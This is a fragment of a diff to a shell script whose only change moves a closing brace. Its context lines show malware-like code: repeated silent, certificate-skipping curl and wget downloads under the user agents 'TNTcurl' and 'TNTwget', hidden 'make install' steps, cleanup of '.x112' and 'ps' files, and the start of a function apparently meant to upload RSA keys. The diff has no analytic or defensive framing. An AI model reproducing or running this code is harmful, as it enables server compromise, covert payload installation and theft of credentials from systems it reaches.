@@ -42,7 +42,7 @@ WGETPARA="--max-redirect 5 --no-check-certificate --quiet"
 CURLPARA="-L --max-redirs 5 --insecure --silent"
 
 curl --referer $REFERER --user-agent=TNTcurl $CURLPARA $GETFROM -o $PUTITTO || curl --referer $REFERER --user-agent=TNTcurl $CURLPARA $GETFROM -o $PUTITTO || curl --referer $REFERER --user-agent=TNTcurl $CURLPARA $GETFROM -o $PUTITTO ||  curl --referer $REFERER --user-agent=TNTcurl $CURLPARA $GETFROM -o $PUTITTO || wget --referer=$REFERER --user-agent=TNTwget $WGETPARA $GETFROM -O $PUTITTO || wget --referer=$REFERER --user-agent=TNTwget $WGETPARA $GETFROM -O $PUTITTO || wget --referer=$REFERER --user-agent=TNTwget $WGETPARA $GETFROM -O $PUTITTO || wget --referer=$REFERER --user-agent=TNTwget $WGETPARA $GETFROM -O $PUTITTO
-
+}
 
 if [ -f "/bin/sbin" ]; then
 echo 'FOUND: sbin'
@@ -100,7 +100,7 @@ make install 2>/dev/null 1>/dev/null
 cd .. 2>/dev/null 1>/dev/null
 rm -rf .x112 ps 2>/dev/null 1>/dev/null
 fi
-}
+
 
  uploadthersa(){
 
